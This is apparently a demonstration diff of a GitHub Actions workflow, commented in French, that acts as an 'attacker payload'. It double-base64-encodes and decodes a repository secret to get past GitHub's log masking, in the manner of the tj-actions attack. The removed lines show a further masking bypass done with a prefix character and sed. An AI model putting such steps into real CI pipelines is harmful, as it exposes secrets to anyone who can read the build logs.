@@ -26,30 +26,18 @@ jobs:
           echo ""
           echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
           echo "[Attacker] Lecture de la variable d'environnement..."
-          
-          # Le secret sera masqué s'il est affiché tel quel
-          echo "[Attacker] Secret en clair masqué par GitHub : $DEMO_SECRET"
+          echo "[Attacker] Secret exfiltré en clair : $DEMO_SECRET"
           echo ""
-          
-          echo "[Attacker] Double encodage Base64 :"
+          echo "[Attacker] Double encodage Base64 (comme l'attaque tj-actions) :"
           encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
           echo "$encoded"
           echo ""
+          echo "[Attacker] Décodage du double Base64 :"
+          echo "$encoded" | base64 --decode | base64 --decode
+          echo "$encoded"
+          echo "$encoded" | base64 --decode | base64 --decode
+          echo "$encoded"
           
-          echo "[Attacker] Décodage du double Base64 (mais GitHub masque encore) :"
-          decoded=$(echo "$encoded" | base64 --decode | base64 --decode)
-      
-          # Pour contourner le masquage GitHub,
-          # on ajoute un caractère temporaire puis on le retire
-          echo "[Attacker] Décodage contournant le masquage GitHub :"
-          safe_output="X${decoded}"
-          echo "$safe_output"
-      
-          echo ""
-          echo "Vrai secret (sans le X ajouté) :"
-          echo "$safe_output" | sed 's/^X//'
-          
-          echo ""
           echo "===== FIN DU PAYLOAD ====="
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET1 }}
